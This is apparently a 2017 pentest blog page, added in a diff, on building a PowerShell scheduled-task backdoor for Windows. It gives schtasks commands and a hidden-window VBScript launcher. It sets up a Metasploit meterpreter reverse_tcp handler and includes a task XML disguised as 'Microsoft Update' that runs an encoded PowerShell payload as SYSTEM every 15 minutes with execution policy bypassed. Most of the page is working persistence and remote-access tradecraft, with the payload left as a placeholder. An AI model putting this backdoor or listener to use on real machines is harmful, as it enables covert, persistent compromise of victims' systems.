@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>powershell定时任务后门</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/power-schtask-backdoor.html" rel="bookmark"
+           title="Permalink to powershell定时任务后门">powershell定时任务后门</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-05-24T00:00:00+02:00">
+                <a href='#'>05/24/2017 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>windows下查询定时任务，会出现无法加载列资源的情况：</p>
+<p><a href="https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1</a></p>
+<div class="highlight"><pre><span></span><span class="n">chcp</span> <span class="mi">437</span>  <span class="o">//</span><span class="n">cmd执行之后</span><span class="err">，切换到英文的</span><span class="n">cmd</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="n">schtasks</span> <span class="o">/</span><span class="n">query</span>  <span class="o">//</span><span class="err">列出所有</span><span class="n">task</span>
+<span class="n">schtasks</span> <span class="o">/</span><span class="n">query</span> <span class="o">/</span><span class="n">xml</span>  <span class="o">//</span><span class="err">列出所有</span><span class="n">xml文件格式的定时任务</span>
+<span class="n">schtasks</span> <span class="o">/</span><span class="n">query</span> <span class="o">/</span><span class="n">xml</span> <span class="o">/</span><span class="n">TN</span> <span class="s1">&#39;name&#39;</span> <span class="o">//</span><span class="err">列出某个任务的详细信息（</span><span class="n">TN</span><span class="p">:</span> <span class="n">TaskName</span><span class="p">)</span>
+<span class="n">schtasks</span> <span class="o">/</span><span class="k">delete</span> <span class="o">/</span><span class="n">TN</span>  <span class="ss">&quot;name&quot;</span> <span class="o">//</span><span class="err">删除某个定时任务，这个名字可以再</span><span class="n">query的时候找到</span><span class="p">,</span> <span class="o">/</span><span class="n">f</span> <span class="err">强制删除</span>
+</pre></div>
+
+
+<p>一种是定时任务，但是执行powershell的时候会弹窗
+<a href="https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work">https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work</a></p>
+<p>https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/
+设置userid   <UserId>NT AUTHORITY\SYSTEM</UserId> 即可</p>
+<div class="highlight"><pre><span></span><span class="n">Dim</span> <span class="n">shell</span><span class="p">,</span><span class="n">command</span>
+<span class="n">command</span> <span class="o">=</span> <span class="ss">&quot;powershell.exe -nologo -command \\PrintServer\PrintRelease.ps1&quot;</span>
+<span class="k">set</span> <span class="n">shell</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="ss">&quot;WScript.Shell&quot;</span><span class="p">)</span>
+<span class="n">shell</span><span class="p">.</span><span class="n">Run</span> <span class="n">command</span><span class="p">,</span><span class="mi">0</span>
+</pre></div>
+
+
+<p>msf接收多个shell可以如下这样做：</p>
+<div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="k">handler</span>
+<span class="k">set</span> <span class="n">PAYLOAD</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
+<span class="k">set</span> <span class="n">LHOST</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">117</span>
+<span class="k">set</span> <span class="n">LPORT</span> <span class="mi">31337</span>
+<span class="k">set</span> <span class="n">ExitOnSession</span> <span class="k">false</span>
+<span class="n">exploit</span> <span class="o">-</span><span class="n">j</span> <span class="o">-</span><span class="n">z</span>
+
+<span class="err">或者上面的保存为</span><span class="n">listener</span><span class="p">.</span><span class="n">rc</span><span class="err">，然后</span><span class="n">msfconsole启动</span>
+<span class="n">msfconsole</span> <span class="o">-</span><span class="n">r</span> <span class="p">.</span><span class="o">/</span><span class="n">listener</span><span class="p">.</span><span class="n">rc</span>
+</pre></div>
+
+
+<p>XML文件如下:</p>
+<div class="highlight"><pre><span></span><span class="o">&lt;!--</span> \<span class="nv">Microsoft</span> <span class="nv">Update</span> <span class="o">--&gt;</span>
+
+<span class="o">&lt;</span><span class="nv">Task</span> <span class="nv">version</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">1.2</span><span class="s2">&quot;</span> <span class="nv">xmlns</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">http://schemas.microsoft.com/windows/2004/02/mit/task</span><span class="s2">&quot;</span><span class="o">&gt;</span>
+
+  <span class="o">&lt;</span><span class="nv">RegistrationInfo</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">Date</span><span class="o">&gt;</span><span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">25</span><span class="nv">T11</span>:<span class="mi">22</span>:<span class="mi">53</span><span class="o">&lt;/</span><span class="nv">Date</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">Author</span><span class="o">&gt;</span><span class="nv">Microsoft</span> <span class="nv">Update</span><span class="o">&lt;/</span><span class="nv">Author</span><span class="o">&gt;</span>
+
+  <span class="o">&lt;/</span><span class="nv">RegistrationInfo</span><span class="o">&gt;</span>
+
+  <span class="o">&lt;</span><span class="nv">Triggers</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">TimeTrigger</span><span class="o">&gt;</span>
+
+      <span class="o">&lt;</span><span class="nv">Repetition</span><span class="o">&gt;</span>
+
+        <span class="o">&lt;</span><span class="nv">Interval</span><span class="o">&gt;</span><span class="nv">PT15M</span><span class="o">&lt;/</span><span class="nv">Interval</span><span class="o">&gt;</span>
+
+        <span class="o">&lt;</span><span class="nv">StopAtDurationEnd</span><span class="o">&gt;</span><span class="nv">false</span><span class="o">&lt;/</span><span class="nv">StopAtDurationEnd</span><span class="o">&gt;</span>
+
+      <span class="o">&lt;/</span><span class="nv">Repetition</span><span class="o">&gt;</span>
+
+      <span class="o">&lt;</span><span class="nv">StartBoundary</span><span class="o">&gt;</span><span class="mi">2017</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">30</span><span class="nv">T18</span>:<span class="mi">22</span>:<span class="mi">52</span><span class="o">&lt;/</span><span class="nv">StartBoundary</span><span class="o">&gt;</span>
+
+      <span class="o">&lt;</span><span class="nv">Enabled</span><span class="o">&gt;</span><span class="nv">true</span><span class="o">&lt;/</span><span class="nv">Enabled</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;/</span><span class="nv">TimeTrigger</span><span class="o">&gt;</span>
+
+  <span class="o">&lt;/</span><span class="nv">Triggers</span><span class="o">&gt;</span>
+
+  <span class="o">&lt;</span><span class="nv">Principals</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">Principal</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">Author</span><span class="s2">&quot;</span><span class="o">&gt;</span>
+
+      <span class="o">&lt;</span><span class="nv">UserId</span><span class="o">&gt;</span><span class="nv">NT</span> <span class="nv">AUTHORITY</span>\<span class="nv">SYSTEM</span><span class="o">&lt;/</span><span class="nv">UserId</span><span class="o">&gt;</span>
+
+      <span class="o">&lt;</span><span class="nv">LogonType</span><span class="o">&gt;</span><span class="nv">InteractiveToken</span><span class="o">&lt;/</span><span class="nv">LogonType</span><span class="o">&gt;</span>
+
+      <span class="o">&lt;</span><span class="nv">RunLevel</span><span class="o">&gt;</span><span class="nv">LeastPrivilege</span><span class="o">&lt;/</span><span class="nv">RunLevel</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;/</span><span class="nv">Principal</span><span class="o">&gt;</span>
+
+  <span class="o">&lt;/</span><span class="nv">Principals</span><span class="o">&gt;</span>
+
+  <span class="o">&lt;</span><span class="nv">Settings</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">MultipleInstancesPolicy</span><span class="o">&gt;</span><span class="nv">IgnoreNew</span><span class="o">&lt;/</span><span class="nv">MultipleInstancesPolicy</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">DisallowStartIfOnBatteries</span><span class="o">&gt;</span><span class="nv">true</span><span class="o">&lt;/</span><span class="nv">DisallowStartIfOnBatteries</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">StopIfGoingOnBatteries</span><span class="o">&gt;</span><span class="nv">true</span><span class="o">&lt;/</span><span class="nv">StopIfGoingOnBatteries</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">AllowHardTerminate</span><span class="o">&gt;</span><span class="nv">true</span><span class="o">&lt;/</span><span class="nv">AllowHardTerminate</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">StartWhenAvailable</span><span class="o">&gt;</span><span class="nv">false</span><span class="o">&lt;/</span><span class="nv">StartWhenAvailable</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">RunOnlyIfNetworkAvailable</span><span class="o">&gt;</span><span class="nv">false</span><span class="o">&lt;/</span><span class="nv">RunOnlyIfNetworkAvailable</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">IdleSettings</span><span class="o">&gt;</span>
+
+      <span class="o">&lt;</span><span class="nv">StopOnIdleEnd</span><span class="o">&gt;</span><span class="nv">true</span><span class="o">&lt;/</span><span class="nv">StopOnIdleEnd</span><span class="o">&gt;</span>
+
+      <span class="o">&lt;</span><span class="nv">RestartOnIdle</span><span class="o">&gt;</span><span class="nv">false</span><span class="o">&lt;/</span><span class="nv">RestartOnIdle</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;/</span><span class="nv">IdleSettings</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">AllowStartOnDemand</span><span class="o">&gt;</span><span class="nv">true</span><span class="o">&lt;/</span><span class="nv">AllowStartOnDemand</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">Enabled</span><span class="o">&gt;</span><span class="nv">true</span><span class="o">&lt;/</span><span class="nv">Enabled</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">Hidden</span><span class="o">&gt;</span><span class="nv">false</span><span class="o">&lt;/</span><span class="nv">Hidden</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">RunOnlyIfIdle</span><span class="o">&gt;</span><span class="nv">false</span><span class="o">&lt;/</span><span class="nv">RunOnlyIfIdle</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">WakeToRun</span><span class="o">&gt;</span><span class="nv">false</span><span class="o">&lt;/</span><span class="nv">WakeToRun</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">ExecutionTimeLimit</span><span class="o">&gt;</span><span class="nv">P3D</span><span class="o">&lt;/</span><span class="nv">ExecutionTimeLimit</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="nv">Priority</span><span class="o">&gt;</span><span class="mi">7</span><span class="o">&lt;/</span><span class="nv">Priority</span><span class="o">&gt;</span>
+
+  <span class="o">&lt;/</span><span class="nv">Settings</span><span class="o">&gt;</span>
+
+  <span class="o">&lt;</span><span class="nv">Actions</span> <span class="nv">Context</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">Author</span><span class="s2">&quot;</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;</span><span class="k">Exec</span><span class="o">&gt;</span>
+
+      <span class="o">&lt;</span><span class="nv">Command</span><span class="o">&gt;</span><span class="nv">powershell</span>.<span class="nv">exe</span><span class="o">&lt;/</span><span class="nv">Command</span><span class="o">&gt;</span>
+
+      <span class="o">&lt;</span><span class="nv">Arguments</span><span class="o">&gt;-</span><span class="k">exec</span> <span class="nv">bypass</span> <span class="o">-</span><span class="nv">nop</span> <span class="o">-</span><span class="nv">WindowStyle</span> <span class="nv">hidden</span> <span class="o">-</span><span class="nv">e</span> [<span class="nv">payload</span>]<span class="o">&lt;/</span><span class="nv">Arguments</span><span class="o">&gt;</span>
+
+    <span class="o">&lt;/</span><span class="k">Exec</span><span class="o">&gt;</span>
+
+  <span class="o">&lt;/</span><span class="nv">Actions</span><span class="o">&gt;</span>
+
+<span class="o">&lt;/</span><span class="nv">Task</span><span class="o">&gt;</span>
+</pre></div>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
